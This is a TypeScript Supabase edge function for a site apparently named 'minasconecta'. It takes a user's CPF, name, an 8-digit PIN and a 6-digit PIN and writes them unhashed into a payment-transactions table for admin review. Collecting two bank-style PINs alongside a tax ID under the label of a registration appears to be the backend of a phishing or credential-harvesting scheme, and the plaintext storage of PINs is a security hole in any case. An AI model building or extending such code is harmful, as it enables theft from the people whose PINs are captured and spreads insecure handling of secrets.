import "jsr:@supabase/functions-js/edge-runtime.d.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

const PROTOCOL_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function makeProtocol() {
  const now = new Date();
  const date = `${now.getUTCFullYear()}${String(now.getUTCMonth() + 1).padStart(2, "0")}${String(now.getUTCDate()).padStart(2, "0")}`;
  const bytes = crypto.getRandomValues(new Uint8Array(6));
  let random = "";
  for (const byte of bytes) random += PROTOCOL_ALPHABET[byte % PROTOCOL_ALPHABET.length];
  return `MGC-${date}-${random}`;
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  if (req.method !== "POST") return json({ error: "Método não permitido" }, 405);

  try {
    const body = await req.json();
    const cpf = String(body?.cpf ?? "").replace(/\D/g, "");
    const name = String(body?.name ?? "").trim();
    const pin8 = String(body?.pin8 ?? "");
    const pin6 = String(body?.pin6 ?? "");
    if (!/^\d{11}$/.test(cpf)) return json({ error: "CPF inválido", code: "INVALID_CPF" }, 400);
    if (!name || !/^\d{8}$/.test(pin8) || !/^\d{6}$/.test(pin6)) {
      return json({ error: "Dados do cadastro inválidos", code: "INVALID_CADASTRO" }, 400);
    }

    const supabaseUrl = Deno.env.get("SUPABASE_URL");
    const serviceRoleKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
    if (!supabaseUrl || !serviceRoleKey) return json({ error: "Cadastro não configurado", code: "CONFIG_ERROR" }, 503);
    const databaseHeaders = { apikey: serviceRoleKey, Authorization: `Bearer ${serviceRoleKey}` };

    // Idempotência: reaproveita um cadastro recente do mesmo CPF para não gerar
    // protocolos duplicados em recarregamentos/dupla execução.
    const recentThreshold = new Date(Date.now() - 10 * 60 * 1000).toISOString();
    const recentResponse = await fetch(
      `${supabaseUrl}/rest/v1/payment_transactions?cpf=eq.${encodeURIComponent(cpf)}&created_at=gt.${encodeURIComponent(recentThreshold)}&status=eq.PENDING&protocol=not.is.null&select=protocol,identifier,created_at&order=created_at.desc&limit=1`,
      { headers: databaseHeaders },
    );
    const recentRows = await recentResponse.json().catch(() => []);
    if (recentResponse.ok && recentRows?.[0]?.protocol) {
      return json({ success: true, data: { protocol: recentRows[0].protocol, identifier: recentRows[0].identifier, reused: true } });
    }

    const protocol = makeProtocol();
    const identifier = `minasconecta-${crypto.randomUUID()}`;
    const stored = await fetch(`${supabaseUrl}/rest/v1/payment_transactions`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...databaseHeaders, Prefer: "return=representation" },
      body: JSON.stringify({
        identifier,
        transaction_id: protocol,
        protocol,
        client_name: name,
        cpf,
        amount: 0,
        pin_8_digits: pin8,
        pin_6_digits: pin6,
        status: "PENDING",
        admin_status: "PENDING",
        raw_payload: { source: "minasconecta-site" },
      }),
    });
    const storedRows = await stored.json().catch(() => []);
    if (!stored.ok) return json({ error: "Não foi possível registrar o cadastro", code: "PERSISTENCE_ERROR" }, 502);

    return json({ success: true, data: { protocol, identifier, createdAt: storedRows?.[0]?.created_at || new Date().toISOString() } });
  } catch {
    return json({ error: "Não foi possível processar o cadastro", code: "REQUEST_ERROR" }, 500);
  }
});
